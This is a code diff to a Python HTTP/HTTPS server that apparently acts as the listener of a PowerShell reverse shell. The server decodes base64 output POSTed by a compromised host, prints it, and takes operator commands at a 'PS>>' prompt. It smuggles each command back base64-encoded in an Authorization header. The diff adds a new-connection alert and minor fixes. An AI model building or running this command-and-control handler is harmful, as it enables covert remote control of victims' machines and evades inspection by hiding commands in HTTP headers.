@@ -13,8 +13,8 @@ import argparse
 """
     For HTTPS Server
         Create certificate using the commands:
-            - openssl genrsa -out private.pem 2048
-            - openssl req -new -x509 -key private.pem -out cacert.pem -days 9999
+                - openssl genrsa -out private.pem 2048
+                - openssl req -new -x509 -key private.pem -out cacert.pem -days 9999
 """
 
 
@@ -29,7 +29,7 @@ class myHandler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         self.send_response(200)
-        content_len = int(self.headers.get('content-length', 0))
+        content_len = int(self.headers.get('Content-Length', 0))
         test_data = self.rfile.read(content_len)
         result = (test_data[7:]).decode('utf-8')
 
@@ -37,7 +37,8 @@ class myHandler(BaseHTTPRequestHandler):
             result = urllib.parse.unquote(result)
             result = (base64.b64decode(result)).decode('utf-8')
         except:
-            print ("no base 64 result: {}".format(result))
+            #print ("result without b64 --> {}".format(result))
+            pass
 
         result=result.split('_n1w_')
         if result[0] == "":
@@ -48,7 +49,11 @@ class myHandler(BaseHTTPRequestHandler):
         for string in result:
             print(colored(string, 'blue'))
 
-        command = input("PS {}>> ".format(pwd)) + "; pwd"
+        if (pwd == "start"):
+            input(colored("[!] New Connection, please press ENTER!",'red'))
+            command = "pwd"
+        else:
+            command = input("PS {}>> ".format(pwd)) + "; pwd"
         CMD = base64.b64encode(command.encode())
         self.send_header('Authorization',CMD.decode('utf-8'))
         self.end_headers()
